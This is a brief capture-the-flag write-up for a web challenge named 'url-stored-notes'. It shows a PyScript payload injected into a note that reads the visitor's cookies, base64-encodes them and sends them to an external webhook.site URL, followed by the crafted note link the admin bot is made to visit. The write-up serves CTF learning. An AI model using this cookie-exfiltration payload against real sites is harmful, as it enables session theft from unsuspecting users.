# url-stored-notes (web)

There is an admin bot with a flag cookie, we want to steal.
To do this, we use the `<py-script>` tag (https://docs.pyscript.net/latest/tutorials/getting-started.html) to run the following Python code:

```py
import base64

cookie = js.document.cookie
encoded = base64.b64encode(cookie.encode('utf8')).decode('utf8')
print(encoded)

from pyodide.http import open_url
open_url("https://webhook.site/05fbedac-c57d-481e-8154-d03080ea9858/" + encoded)
```

When visiting this node, it extracts the visitor's cookies and sends them to our webhook.
The note URL is http://url-stored-notes.chals.damctf.xyz/#/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AEwAN5dAC2ewEcDz40ozKl1G8Hi7NGQkjZaXlysiSlg5ZT9Rjsjhpnk7LR0yc4GybDNMvgz8IEhumU7h6mFWr6IC5e1djENJ4VIDZ5hKQeQP0/cOO/nmyXoeP3UbVVFQXo2QK8RmA//n61WopaMGORiQlgmkjnID8gouJm8nPMac3z0vdSRS/4m6G4od8O8Ag33kcyDr3uNrlFvhBvURz0UBKss9nGw7otein6PQ2TiuRTw643Ywkloa7PgASaxFMM3cgT6iDCHNd5BlVt+vxX01U43V6mquZxnzVdYe+6xulZZgAAAAHOt//oA6MXOAAH6AbECAACDOnbsscRn+wIAAAAABFla which we make the bot visit to get the flag.
